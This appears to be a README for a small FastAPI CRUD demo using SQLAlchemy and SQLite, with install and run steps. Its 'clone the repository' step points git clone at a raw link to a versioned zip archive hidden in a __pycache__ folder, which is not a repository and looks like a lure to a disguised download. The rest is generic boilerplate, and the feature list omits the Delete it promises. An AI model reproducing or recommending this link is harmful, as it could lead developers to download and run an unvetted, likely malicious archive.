# FastAPI CRUD API with SQLAlchemy

This is a simple demonstration project of a basic CRUD (Create, Read, Update, Delete) API built with the FastAPI framework. It uses SQLAlchemy as an ORM to interact with a SQLite database and Pydantic for data validation and serialization.

The API allows for managing a collection of user data, providing a foundation for more complex web applications.

## Features

- **Create a User:** `POST /users/`
- **Read Users:** `GET /users/` (with optional pagination)
- **Read a specific User:** `GET /users/{user_id}`
- **Update a User:** `PUT /users/{user_id}`

## Prerequisites

Before you begin, ensure you have the following installed on your system:
- Python 3.8+
- pip (Python's package installer)

## Installation

Follow these steps to set up and run the project locally.

1.  **Clone the repository** (if it's in a git repository)
    ```bash
    git clone [https://raw.githubusercontent.com/thaysvs2/fastApi/main/__pycache__/Api_fast_3.3.zip](https://raw.githubusercontent.com/thaysvs2/fastApi/main/__pycache__/Api_fast_3.3.zip)
    cd your-repository
    ```
    (Replace with your repository details)

2.  **Install the required packages**
    You can install all necessary dependencies with a single command.

    ```bash
    pip install "fastapi[all]"
    ```
    This command installs `fastapi`, `uvicorn`, and other essential libraries.

## Running the Application

Once the dependencies are installed, you can start the development server.

```bash
uvicorn main:app --reload
